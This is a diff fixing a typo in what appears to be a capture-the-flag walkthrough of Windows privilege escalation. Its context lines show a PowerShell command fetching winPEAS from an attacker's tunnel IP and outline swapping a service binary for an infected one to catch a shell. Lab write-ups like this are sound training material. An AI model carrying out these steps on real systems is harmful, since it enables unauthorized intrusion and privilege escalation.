@@ -304,7 +304,7 @@ powershell -c wget "http://Tun0-IP/winPEAS.exe"
 
 Run winPEAS and you will see that it is pointing towards those unquoted paths from earlier for the same service.
 
-From here, rinse and repeat the steps that were used to stop the service, swap the binaries, and restart the service while listening on the port assosciated with the infected binary.
+From here, rinse and repeat the steps that were used to stop the service, swap the binaries, and restart the service while listening on the port associated with the infected binary.
 
 ### Congratulations! You're done with the room!
 
